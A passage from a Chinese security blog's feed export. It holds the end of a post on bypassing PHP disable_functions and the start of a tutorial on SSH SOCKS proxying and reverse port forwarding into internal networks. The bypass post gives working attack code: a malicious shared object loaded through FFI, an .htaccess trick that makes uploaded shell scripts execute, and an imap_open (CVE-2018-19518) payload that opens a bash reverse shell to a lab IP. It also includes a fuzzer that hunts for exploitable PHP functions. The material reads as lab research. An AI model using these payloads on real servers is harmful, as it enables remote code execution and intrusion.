class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>成功执行</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis11.png" alt></p><p>​    这里如果只定义 system 函数而省略 libc.so.6 同样也是可以执行命令的，支持 RTLD_DEFAULT 的平台将尝试在常规全局范围内查找在代码中声明的符号</p><p>​    当我们只能控制 FFI::cdef 函数的 lib 参数的时候，FFI::cdef 函数还可以加载我们自定义的动态链接库，但是需要填写绝对路径，否则会无法加载，比如</p><p>ffi.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">        <span class="string">"int system(const char *command);"</span>,</span><br><span class="line">        <span class="string">"/var/www/html/bad.so"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>bad.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">__attribute__((constructor)) <span class="function"><span class="keyword">void</span> <span class="title">j0k3r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">"echo Hacked &amp;&amp; id"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要加载编译好的 bad.so 即可执行恶意代码</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis12.png" alt></p><h3 id="9-Apache-mod-cgi-修改-htaccess-绕过限制"><a href="#9-Apache-mod-cgi-修改-htaccess-绕过限制" class="headerlink" title="9. Apache mod_cgi 修改 .htaccess 绕过限制"></a>9. Apache mod_cgi 修改 .htaccess 绕过限制</h3><p>有几个利用条件</p><ol><li>Apache 开启 AllowOverride</li><li>开启 cgi_module</li><li>.htaccess 文件可写</li><li>cgi 程序可执行</li></ol><p>本地测试环境推荐使用 Docker，会比较最方便</p><p><code>docker pull bronsonbdevost/cgi-web-server</code></p><p>默认 cgi 目录在 /usr/local/apache2/cgi-bin，配置文件位于 /usr/local/apache2/conf/httpd.conf</p><p>默认没有 PHP，安装</p><p><code>apt-get install php5-common libapache2-mod-php5</code></p><p>安装 libsqlite3-0 404 的话可以到网站下载</p><p><a href="https://packages.debian.org/zh-cn/jessie/amd64/libsqlite3-0/download" target="_blank" rel="noopener">https://packages.debian.org/zh-cn/jessie/amd64/libsqlite3-0/download</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://security.debian.org/debian-security/pool/updates/main/s/sqlite3/libsqlite3-0_3.8.7.1-1+deb8u4_amd64.deb</span><br><span class="line"></span><br><span class="line">dpkg -i libsqlite3-0_3.8.7.1-1+deb8u4_amd64.deb</span><br></pre></td></tr></table></figure><p>添加 php5 模块配置文件</p><p><code>cp /etc/apache2/mods-available/php5.conf.dpkg-new conf/extra/php5_module.conf</code></p><p>修改 httpd.conf </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php5-script php</span><br><span class="line">LoadModule php5_module /usr/lib/apache2/modules/libphp5.so</span><br><span class="line"></span><br><span class="line">Include conf/extra/php5_module.conf</span><br></pre></td></tr></table></figure><p>重启 Apache</p><p><code>/usr/local/apache2/bin/apachectl restart</code></p><p>模拟写入恶意 .htaccess 文件，添加后缀 .sh </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .sh</span><br></pre></td></tr></table></figure><p>上传 sh 文件，浏览器访问即可执行其中的命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Content-type: text/html"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Hello, Shell"</span></span><br><span class="line">curl 192.168.214.107:7777</span><br></pre></td></tr></table></figure><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis13.png" alt></p><h3 id="10-利用-PHP-bug-Bypass-disable-functions"><a href="#10-利用-PHP-bug-Bypass-disable-functions" class="headerlink" title="10. 利用 PHP bug Bypass disable_functions"></a>10. 利用 PHP bug Bypass disable_functions</h3><p>利用两个 PHP 历史漏洞来绕过 disable_functions</p><p>Exploits ：</p><p><a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">https://github.com/mm0r1/exploits</a></p><h4 id="1-Use-after-free-with-json-serializer"><a href="#1-Use-after-free-with-json-serializer" class="headerlink" title="(1) Use after free with json serializer"></a>(1) Use after free with json serializer</h4><p><a href="https://bugs.php.net/bug.php?id=77843" target="_blank" rel="noopener"></a></p><ul><li>适用目标：<ul><li>7.1 - all versions to date</li><li>7.2 &lt; 7.2.19 (released: 30 May 2019)</li><li>7.3 &lt; 7.3.6 (released: 30 May 2019)</li></ul></li></ul><p>php-json-bypass</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis14.png" alt></p><h4 id="2-Use-After-Free-in-GC-with-Certain-Destructors"><a href="#2-Use-After-Free-in-GC-with-Certain-Destructors" class="headerlink" title="(2) Use After Free in GC with Certain Destructors"></a>(2) Use After Free in GC with Certain Destructors</h4><p><a href="https://bugs.php.net/bug.php?id=72530" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=72530</a></p><ul><li>适用目标：<ul><li>7.0 - all versions to date</li><li>7.1 - all versions to date</li><li>7.2 - all versions to date</li><li>7.3 - all versions to date</li></ul></li></ul><p>php7-gc-bypass</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis15.png" alt></p><p>测试在 ubuntu16.04 + PHP 7.1.33 的环境下两个 exp 都是可以正常使用的，但如果是在 Docker 或者是其他环境下那就不一定了</p><h3 id="11-PHP-imap-open-RCE-漏洞-（CVE-2018-19518）"><a href="#11-PHP-imap-open-RCE-漏洞-（CVE-2018-19518）" class="headerlink" title="11. PHP imap_open RCE 漏洞 （CVE-2018-19518）"></a>11. PHP imap_open RCE 漏洞 （CVE-2018-19518）</h3><p>要求 PHP 安装 imap 模块</p><p>反弹 shell payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">"/bin/bash -i &gt;&amp; /dev/tcp/192.168.214.107/7777 0&gt;&amp;1"</span>;</span><br><span class="line">$base64 = base64_encode($payload);</span><br><span class="line">$server = <span class="string">"any -oProxyCommand=echo\t&#123;$base64&#125;|base64\t-d|bash"</span>;</span><br><span class="line">@imap_open(<span class="string">"&#123;"</span>.$server.<span class="string">"&#125;:143/imap&#125;INBOX"</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br></pre></td></tr></table></figure><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis17.png" alt></p><h3 id="一些利用工具"><a href="#一些利用工具" class="headerlink" title="一些利用工具"></a>一些利用工具</h3><p>1.Bypass disable_functions 工具:</p><p><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a></p><p>2.AntSword 绕过 PHP disable_functions 插件:</p><p><a href="https://github.com/Medicean/as_bypass_php_disable_functions" target="_blank" rel="noopener">antsword bypass PHP disable_functions</a></p><p><a href="https://0xdf.gitlab.io/2019/08/02/bypassing-php-disable_functions-with-chankro.html" target="_blank" rel="noopener">3.Chankro:</a></p><p><a href="https://github.com/TarlogicSecurity/Chankro" target="_blank" rel="noopener">https://github.com/TarlogicSecurity/Chankro</a></p><h2 id="0x02-Fuzz-挖掘含内部系统调用的函数"><a href="#0x02-Fuzz-挖掘含内部系统调用的函数" class="headerlink" title="0x02 Fuzz 挖掘含内部系统调用的函数"></a>0x02 Fuzz 挖掘含内部系统调用的函数</h2><p>​    主要是指使用 LD_PRELOAD 这种方式绕过 disable_functions 的时候，需要满足一个条件，就是使用的 php 函数需要在内部调用 execve 等系统功能开启一个新进程</p><p>​    那怎么知道到底哪些函数可以满足这种绕过方法呢，之前看到有一篇国外的文章 <a href="https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/" target="_blank" rel="noopener">Fuzzer gets us new functions to bypass PHP disable_functions</a> ，文中讲了如何使用 Fuzz 获得这一类 php 函数</p><p>​    大体思路就是尽可能多的安装 php 的各种模块，增加 php 内部定义的函数数量，然后确定每个函数所需要的参数个数范围，接着输入参数，运行函数，strace 查看是否有 execve 系统调用的行为发生</p><p>​    在获取函数的参数信息方面，使用的是 php 的函数反射类——ReflectionFunction，getNumberOfRequiredParameters() getNumberOfParameters() 方法分别获取函数的最小和最大参数个数，原文中直接使用报错信息判断参数个数未免不够优雅</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/image-20200131192719453.png" alt="image-20200131192719453"></p><p>​    参数数目确定了，接着就是数据类型，但是每个参数的类型都不一定相同</p><p>​    其实 ReflectionParameter 类的 getClass() 方法能获得类型提示类，getType() 直接获取参数类型，但是这个用在用户自定义函数的参数上还行，对于内部函数来说返回值都是 NULL，基本用不了。举个例子</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/image-20200131195140178.png" alt="image-20200131195140178"></p><p>​    如图，用户自定义函数 foo 能够通过反射直接获得一个 <strong>ReflectionNamedType</strong>类，getName() 得到参数类型，比较迷的是 php 官方文档上写的是 ReflectionType，具体见： <a href="https://www.php.net/manual/zh/class.reflectionparameter.php" target="_blank" rel="noopener">PHP: ReflectionParameter - Manual</a>这一页，而搜索 ReflectionNamedType 得到的却是 <a href="https://www.php.net/manual/zh/class.reflectionnamedtype" target="_blank" rel="noopener">404</a>，看来 php 在反射这方面的文档还没有完善</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/image-20200131195807351.png" alt="image-20200131195807351"></p><p>但是 php 作为一个弱类型语言这时候就凸显了它的优势，很多 php 函数本身就是  mixed 类型，而且 php 还会自动进行类型转换</p><p>像 ‘1../../../../../../../../../etc/passwd’ 这种参数就能同时满足 string、int、file、bool 四种类型，基本满足绝大部分函数了</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/image-20200131032400498.png" alt="image-20200131032400498"></p><p>​    感觉原文那代码处理的不太好，还有 bug，自己写了一个，加了个可以 fuzz 指定 php 模块的功能，比如安装了 gnupg 拓展，可以 Fuzz 该模块下的所有函数，方便测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAllDefinedFunc</span><span class="params">()</span>:</span></span><br><span class="line">    get_defined_function = os.popen(<span class="string">"php -r 'print_r(get_defined_functions()[\"internal\"]);'"</span>).readlines()</span><br><span class="line">    <span class="comment">#print get_defined_function</span></span><br><span class="line">    b = get_defined_function[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">    b = map(str.strip, b)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(b)):</span><br><span class="line">        b[i] = re.sub(<span class="string">r'.*&gt; '</span>, <span class="string">''</span>, b[i])</span><br><span class="line">    get_defined_function = b<span class="comment"># all defined PHP functions</span></span><br><span class="line">    get_defined_function.remove(get_defined_function[<span class="number">0</span>])</span><br><span class="line">    get_defined_function.remove(get_defined_function[<span class="number">0</span>])</span><br><span class="line">    get_defined_function.remove(<span class="string">'readline'</span>)</span><br><span class="line">    <span class="keyword">return</span> get_defined_function</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getModuleFunc</span><span class="params">(phpModuleName,getDefinedFunction)</span>:</span></span><br><span class="line">    moduleFunc = []</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> getDefinedFunction:</span><br><span class="line">        getExtNameCmd = <span class="string">"php -r \"echo (new ReflectionFunction('&#123;&#125;'))-&gt;getExtensionName();\""</span>.format(func)</span><br><span class="line">        extName = os.popen(getExtNameCmd).readlines()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> extName == phpModuleName:</span><br><span class="line">            moduleFunc.append(func)</span><br><span class="line">    <span class="keyword">return</span> moduleFunc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzzFunc</span><span class="params">(getDefinedFunction)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> getDefinedFunction:</span><br><span class="line">        maxParaNumCmd = <span class="string">"php -r \"echo (new ReflectionFunction('&#123;&#125;'))-&gt;getNumberOfParameters();\""</span>.format(func)</span><br><span class="line">        minParaNumCmd = <span class="string">"php -r \"echo (new ReflectionFunction('&#123;&#125;'))-&gt;getNumberOfRequiredParameters();\""</span>.format(func)</span><br><span class="line">        maxParaNum = int(os.popen(maxParaNumCmd).readlines()[<span class="number">0</span>])</span><br><span class="line">        minParaNum = int(os.popen(minParaNumCmd).readlines()[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">print</span> maxParaNum</span><br><span class="line">        <span class="keyword">print</span> minParaNum</span><br><span class="line">        <span class="keyword">for</span> paraNum <span class="keyword">in</span> range(minParaNum,maxParaNum + <span class="number">1</span>):</span><br><span class="line">            paraMeters = [<span class="string">'\'1../../../../../../../../../etc/passwd\''</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(paraNum)]</span><br><span class="line">            paraMeters = <span class="string">','</span>.join(paraMeters)</span><br><span class="line">            newPhpCmd = <span class="string">"php -r \"&#123;&#125;(&#123;&#125;);\""</span>.format(func,paraMeters)</span><br><span class="line">            <span class="keyword">print</span> newPhpCmd</span><br><span class="line">            newFuzzCmd = <span class="string">"strace -f &#123;&#125; 2&gt;&amp;1 | grep -E 'execve|fork|vfork'"</span>.format(newPhpCmd)</span><br><span class="line">            <span class="keyword">print</span> newFuzzCmd</span><br><span class="line">            out = re.findall(<span class="string">r'execve'</span>, <span class="string">''</span>.join(os.popen(newFuzzCmd).readlines()[<span class="number">1</span>:]))</span><br><span class="line">            <span class="keyword">print</span> out</span><br><span class="line">            <span class="keyword">if</span> len(out) &gt;= <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">with</span> open(<span class="string">'fuzz-out.txt'</span>,<span class="string">'a+'</span>) <span class="keyword">as</span> file:</span><br><span class="line">                    file.write(newPhpCmd + <span class="string">"\n"</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        phpModuleName = sys.argv[<span class="number">1</span>]</span><br><span class="line">        getDefinedFunction = getAllDefinedFunc()</span><br><span class="line">        moduleFunc = getModuleFunc(phpModuleName,getDefinedFunction)</span><br><span class="line">        <span class="keyword">if</span> len(moduleFunc) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">'没有找到与指定模块相关的函数，检查名称是否正确'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment">#print moduleFunc</span></span><br><span class="line">            fuzzFunc(moduleFunc)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'fuzz all'</span>)</span><br><span class="line">        getDefinedFunction = getAllDefinedFunc()</span><br><span class="line">        fuzzFunc(getDefinedFunction)</span><br></pre></td></tr></table></figure><p>Fuzz 测试结果：</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/fuzz-1.png" alt="fuzz-1"></p><p>单一模块 Fuzz 结果：</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/image-20200131201820976.png" alt="image-20200131201820976"></p><p>这种方式可以用于发现新的可用于 bypass 的函数，或者用来检测安全过滤够不够严格</p><h3 id="利用-OPcache-执行命令"><a href="#利用-OPcache-执行命令" class="headerlink" title="利用 OPcache 执行命令"></a>利用 OPcache 执行命令</h3><p><strong>注</strong>：<strong>OPcache 不能饶过 disable_functions</strong>，它调用内部函数或方法时仍然会被限制</p><p>OPcache 通过将 PHP 脚本预编译的字节码（Operate Code）存储到共享内存中来提升 PHP 的性能</p><p>如果我们知道 OPcache 的缓存路径，就可以通过替换缓存文件来直接执行系统命令</p><p>首先是要求 PHP 开启了 OPcache，下面是 php.ini 中的 OPcache 常规配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[opcache]</span><br><span class="line">zend_extension=/usr/lib/php/20151012/opcache.so</span><br><span class="line">opcache.enable=1</span><br><span class="line">opcache.enable_cli=1</span><br><span class="line">opcache.memory_consumption=528</span><br><span class="line">opcache.interned_strings_buffer=8</span><br><span class="line">opcache.max_accelerated_files=10000</span><br><span class="line">opcache.revalidate_freq=1</span><br><span class="line">opcache.fast_shutdown=1</span><br><span class="line">opcache.validate_timestamps=0</span><br><span class="line">opcache.file_cache=/tmp</span><br></pre></td></tr></table></figure><p>其中的 opcache.file_cache 则是指定缓存目录，比如设置 /tmp，运行 /var/www/html/ 下的 index.php 则会生成相应的 /tmp/[system_id]/var/www/html/index.php.bin 文件</p><p>system_id 是当前 PHP 版本号，Zend 扩展版本号以及各个数据类型大小的 MD5 值</p><p>在另一个环境下利用 opcache 得到一个包含恶意代码的缓存文件，更改其文件头后面的 system_id 为要替换的缓存文件的 system_id，只需更改 system_id，文件 16 进制中的 php 文件目录即使不同也无需更改</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis19.png" alt></p><p>替换相应缓存目录下的缓存文件，再次运行查看运行结果</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis18.png" alt></p><h2 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h2><p><a href="https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/" target="_blank" rel="noopener">https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/</a></p><p><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p><p><a href="https://www.cnblogs.com/leixiao-/p/10612798.html" target="_blank" rel="noopener">https://www.cnblogs.com/leixiao-/p/10612798.html</a></p><p><a href="https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/" target="_blank" rel="noopener">https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文章首发于安全客：&lt;a href=&quot;https://www.anquanke.com/post/id/197745&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/197745&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="http://j0k3r.top/tags/PHP/"/>
    
      <category term="disable_functions" scheme="http://j0k3r.top/tags/disable-functions/"/>
    
  </entry>
  
  <entry>
    <title>使用 SSH 建立 socks 代理进行内网穿透</title>
    <link href="http://j0k3r.top/2020/01/08/ssh-proxy/"/>
    <id>http://j0k3r.top/2020/01/08/ssh-proxy/</id>
    <published>2020-01-07T16:00:00.000Z</published>
    <updated>2020-03-26T10:19:06.722Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读</p><a id="more"></a><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><blockquote><p> SSH (Secure Shell) 是一种加密网络协议，用于在不安全的网络上安全地运行网络服务。</p></blockquote><blockquote><p>OpenSSH 是用于使用 SSH 协议进行远程登录的主要连接工具。对所有流量进行加密，此外，OpenSSH 还提供了一整套安全的隧道功能，多种身份验证方法以及复杂的配置选项。</p></blockquote><p>在一般的 Linux 机器中默认都会装有 OpenSSH，那么在偶尔需要建立代理访问内部网络的时候，抛弃一些其它代理程序的繁琐配置，使用 ssh 不失为一种方便快捷的办法</p><p>OpenSSH 命令手册： <a href="https://man.openbsd.org/ssh" target="_blank" rel="noopener">ssh(1) - OpenBSD manual pages</a></p><h2 id="0x02-准备"><a href="#0x02-准备" class="headerlink" title="0x02 准备"></a>0x02 准备</h2><p>ssh 配置文件 /etc/ssh/sshd_config 中默认没有 GatewayPorts 这一项或者值为 no</p><p><a href="https://man.openbsd.org/sshd_config.5#GatewayPorts" target="_blank" rel="noopener"><code>GatewayPorts</code></a> 用于指定是否允许远程主机连接到为客户端转发的端口，参数为 no 强制远程端口转发仅对本地主机可用，即将远程端口转发绑定到环回地址，防止其他远程主机连接，yes 强制强制远程端口转发绑定到通配符地址，或者指定的其他地址</p><p>根据情况进行合理配置，比如要在公网做转发的时候就需要配置 GatewayPorts yes</p><p><strong>sshd_config</strong> 配置参数手册：<a href="https://man.openbsd.org/sshd_config.5" target="_blank" rel="noopener"><strong>sshd_config —— OpenSSH daemon configuration file</strong></a></p><h2 id="0x03-转发"><a href="#0x03-转发" class="headerlink" title="0x03 转发"></a>0x03 转发</h2><p>在本地使用 Docker 模拟搭建一个简易的网络环境</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ssh-proxy.assets/image-20200203005152618.png" alt="image-20200203005152618"></p><p>如图，都是在内网中的机器，只不过网段不同，使用 ssh 建立代理来访问不同层次的网络</p><p>下面先简单介绍用到的命令参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-p port 连接到远程主机上的端口</span><br><span class="line">-N 不执行远程命令。对于仅转发端口很有用</span><br><span class="line">-f 将 ssh 命令放在后台</span><br><span class="line">-n 从 /dev/null 重定向标准输入（实际上，防止从标准输入读取),在后台运行ssh时必须使用此选项</span><br><span class="line">-q 安静模式。阻止大多数警告和诊断消息。</span><br><span class="line">-g 允许远程主机连接到本地转发的端口</span><br><span class="line">-T 禁用伪终端分配</span><br><span class="line">-p [port] 要连接到远程主机上的端口</span><br><span class="line">-D [bind_address:]port 指定本地“动态”应用程序级端口转发</span><br><span class="line">-R [bind_address:]port:host:hostport 指定与远程（服务器）主机上给定的TCP端口或Unix套接字的连接将转发到本地</span><br></pre></td></tr></table></figure><h3 id="应用场景-一-Host-1-访问-192-168-1-0-24-网络"><a href="#应用场景-一-Host-1-访问-192-168-1-0-24-网络" class="headerlink" title="应用场景 一. Host 1 访问 192.168.1.0/24 网络"></a>应用场景 一. Host 1 访问 192.168.1.0/24 网络</h3><p>图中的 Host 1 有且只有一个 ip，处于 172.16.1.0/24 网络中，能直接访问的主机只有 Host 2</p><p>在 Host 1 使用 ssh 建立一个 socks 代理服务器即可，使用 <code>-D</code></p><p><code>-D</code> 参数是比较关键的一个，建立代理就靠它了，通过分配一个套接字来侦听本地端的端口，每当与此端口建立连接时，该连接都会通过安全通道转发，充当 SOCKS 服务器，支持 SOCKS4 和 SOCKS5 协议</p><blockquote><p>只有root可以转发特权端口（端口号小于 1024 的端口），动态端口转发也可以在配置文件中指定。</p></blockquote><p>Host 1 执行命令:</p><p><code>ssh -fnqgNTD [host 1 port ] -p 22 [host 2 username]@[host 2 ip]</code></p><p>该场景下使用：<code>ssh -fnqgNTD 7777 -p 22 j0k3r@172.16.1.3</code></p><p>Host 1 给当前终端设置 socks 5 代理：<code>export ALL_PROXY=socks5://127.0.0.1:10808</code></p><p>访问 192.168.1.0/24 网络验证一下</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ssh-proxy.assets/image-20200204000948914.png" alt="image-20200204000948914"></p><p> Host 1 发送的网络数据通过 socks 代理和 ssh 连接发送到了 Host 2，于是就能访问 Host 3 的服务了</p><h3 id="引用场景-二-Host-1-访问-10-1-1-0-24-网络"><a href="#引用场景-二-Host-1-访问-10-1-1-0-24-网络" class="headerlink" title="引用场景 二. Host 1 访问 10.1.1.0/24 网络"></a>引用场景 二. Host 1 访问 10.1.1.0/24 网络</h3><p>上图可以看出 Host 2 和 Host 3 同处于 192.168.1.0/24 网络，但是只有 Host 3 还可以访问 10.1.1.0/24，而 Host 1 更是不能直接访问 Host 3，这个时候相对于场景一只需要在中间让 Host 2 把 Host 3 的 22 端口转发给 Host 1 就行了，最终使用场景一中的方法开启代理即可 </p><p>需要用到 ssh <strong>反向代理</strong>，使用 <code>-R</code></p><p><code>-R</code> 参数是转发的关键参数, 指定与远程（服务器）主机上给定的TCP端口或Unix套接字的连接将转发到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-R [bind_address:]port:host:hostport</span><br><span class="line">-R [bind_address:]port:local_socket</span><br><span class="line">-R remote_socket:host:hostport</span><br><span class="line">-R remote_socket:local_socket</span><br><span class="line">-R [bind_address:]port</span><br></pre></td></tr></table></figure><p>举个例子</p><p>Host 2:  <code>ssh -fnqgNTR [host 1 port]:[host 3]:[host 3 port]  -p 22 [host 1 username]@[host 1 ip]</code></p><p>该命令会将 host 3 的 port 转发到 host 1 的 port</p><p>该场景下命令为：<code>ssh -fnqgNTR 6666:192.168.1.3:9090  -p 22 j0k3r@172.16.1.2</code></p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ssh-proxy.assets/image-20200204003159932.png" alt="image-20200204003159932"></p><p>此时 host 1 可以通过访问本地 6666 端口直接访问 host 3 的 9090 端口上的服务</p><p>同理，转发 host 3 的 ssh 端口，再建立代理</p><p>该场景下命令为：</p><p>Host 2: <code>ssh -fngqNTR 7777:192.168.1.3:22 -p 22 j0k3r@172.16.1.2</code></p><p>Host 1: <code>ssh -fngqNTD 6767 -p 7777 j0k3r@127.0.0.1</code>, <code>export ALL_PROXY=socks5://127.0.0.1:6767</code></p><p>此时 host 1 可以通过代理直接访问 host 4</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ssh-proxy.assets/image-20200204023545869.png" alt="image-20200204023545869"></p><h3 id="其他场景"><a href="#其他场景" class="headerlink" title="其他场景"></a>其他场景</h3><h4 id="（1）反向代理穿透内网，外网访问"><a href="#（1）反向代理穿透内网，外网访问" class="headerlink" title="（1）反向代理穿透内网，外网访问"></a>（1）反向代理穿透内网，外网访问</h4><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ssh-proxy.assets/image-20200204024355249.png" alt="image-20200204024355249"></p><h4 id="（2）正向代理"><a href="#（2）正向代理" class="headerlink" 